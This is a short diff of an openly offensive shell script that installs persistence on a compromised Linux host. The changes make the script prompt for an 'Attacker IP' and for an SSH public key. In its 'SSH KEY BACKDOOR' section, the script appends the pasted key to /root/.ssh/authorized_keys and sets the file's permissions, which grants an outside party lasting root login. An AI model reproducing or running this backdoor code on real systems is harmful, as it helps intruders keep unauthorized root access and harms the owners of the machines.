@@ -7,9 +7,9 @@
 # All you need is to change the IP and SSH Key
 
 
-IP="<YOUR VPN IP>"
-
 clear
+
+read -p "Attacker IP: " IP
 
 echo "[+] Installing persistence..."
 
@@ -38,11 +38,13 @@ sleep 2
 # SSH KEY BACKDOOR
 ################################
 
+read -p "Paste SSH public key: " SSHKEY
+
 echo "[+] installing ssh key"
 
 mkdir -p /root/.ssh
 
-echo "<YOUR PUBLIC SSH KEY>" >> /root/.ssh/authorized_keys
+echo "$SSHKEY" >> /root/.ssh/authorized_keys
 
 chmod 600 /root/.ssh/authorized_keys
 
